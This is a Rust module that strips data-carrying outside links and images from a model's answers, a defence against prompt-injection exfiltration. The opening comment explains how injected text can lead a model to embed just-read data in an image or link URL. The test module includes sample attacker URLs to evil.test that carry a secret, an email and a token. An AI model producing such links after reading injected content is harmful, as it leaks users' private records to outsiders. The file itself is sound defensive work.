//! Stops an answer from carrying record data out of the deployment (roadmap
//! N27-T3).
//!
//! A model that read injected text can be talked into writing a link or an
//! image whose URL holds the data it just read: the browser fetches an image
//! by itself, and a reader clicks a link. [`strip_exfiltration`] removes,
//! before the answer is stored or shown:
//!
//! - every image (`![alt](url)` or `<img src=...>`) whose host is not this
//!   deployment's, whatever its URL holds;
//! - every link to another host whose URL carries a query or fragment, the
//!   usual place for smuggled data.
//!
//! A plain link to another site with no query stays, so answers can still
//! cite sources.

/// The host of an `http(s)` URL, lower-cased, without port or credentials.
fn host_of(url: &str) -> Option<String> {
    let rest = url
        .strip_prefix("https://")
        .or_else(|| url.strip_prefix("http://"))?;
    let authority = rest.split(['/', '?', '#']).next()?;
    let host = authority.rsplit('@').next()?.split(':').next()?;
    (!host.is_empty()).then(|| host.to_ascii_lowercase())
}

fn allowed(host: &str, hosts: &[String]) -> bool {
    hosts.iter().any(|h| h.eq_ignore_ascii_case(host))
}

/// Where a URL starting at `start` ends: at whitespace, a closing bracket or
/// parenthesis, a quote or an angle bracket.
fn url_end(text: &str, start: usize) -> usize {
    text[start..]
        .find(|c: char| c.is_whitespace() || matches!(c, ')' | ']' | '"' | '\'' | '<' | '>'))
        .map_or(text.len(), |at| start + at)
}

/// This deployment's own hosts: the web app's host and the public URL's.
pub fn own_hosts(config: &attome_config::AppConfig) -> Vec<String> {
    let mut hosts = vec![config.app.frontend_host.to_ascii_lowercase()];
    if let Some(host) = config.app.public_frontend_url.as_deref().and_then(host_of) {
        hosts.push(host);
    }
    hosts
}

/// `text` with exfiltration links and images removed; `hosts` are this
/// deployment's own.
pub fn strip_exfiltration(text: &str, hosts: &[String]) -> String {
    let mut out = String::with_capacity(text.len());
    let mut i = 0;
    while i < text.len() {
        let rest = &text[i..];
        let Some(rel) = rest.find("http") else {
            out.push_str(rest);
            break;
        };
        let start = i + rel;
        let candidate = &text[start..];
        if !(candidate.starts_with("https://") || candidate.starts_with("http://")) {
            out.push_str(&text[i..start + 4]);
            i = start + 4;
            continue;
        }
        let end = url_end(text, start);
        let url = &text[start..end];
        let Some(host) = host_of(url) else {
            out.push_str(&text[i..end]);
            i = end;
            continue;
        };
        let before = &text[i..start];
        let is_markdown_image = before.ends_with("](") && {
            let open = before.rfind("![");
            let link_open = before.rfind('[');
            open.is_some() && open.map(|o| o + 1) == link_open
        };
        let is_html_image = before
            .to_ascii_lowercase()
            .rfind("<img")
            .is_some_and(|at| !before[at..].contains('>'));
        let outside = !allowed(&host, hosts);
        let carries_data = url.contains('?') || url.contains('#');
        if outside && (is_markdown_image || is_html_image) {
            out.push_str(before);
            out.push_str("[image removed]");
        } else if outside && carries_data {
            out.push_str(before);
            out.push_str("[link removed]");
        } else {
            out.push_str(&text[i..end]);
        }
        i = end;
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn hosts() -> Vec<String> {
        vec!["crm.example.com".to_owned()]
    }

    #[test]
    fn data_carrying_links_and_outside_images_are_removed() {
        let text = "See ![x](https://evil.test/p.png?d=SECRET) and [here](https://evil.test/c?email=a@b.c) \
                    or https://evil.test/#token=1, <img src=\"https://evil.test/a.gif\">";
        let out = strip_exfiltration(text, &hosts());
        assert!(
            !out.contains("SECRET") && !out.contains("email=") && !out.contains("token="),
            "{out}"
        );
        assert!(!out.contains("a.gif"), "{out}");
        assert_eq!(out.matches("[image removed]").count(), 2, "{out}");
        assert_eq!(out.matches("[link removed]").count(), 2, "{out}");
    }

    #[test]
    fn own_links_and_plain_citations_stay() {
        let text =
            "Open https://crm.example.com/records?id=7 and read https://docs.example.org/guide.";
        assert_eq!(strip_exfiltration(text, &hosts()), text);
        assert_eq!(
            strip_exfiltration("no links, just httpd talk", &hosts()),
            "no links, just httpd talk"
        );
        assert_eq!(
            host_of("https://user@Crm.Example.com:8443/x").as_deref(),
            Some("crm.example.com")
        );
    }
}
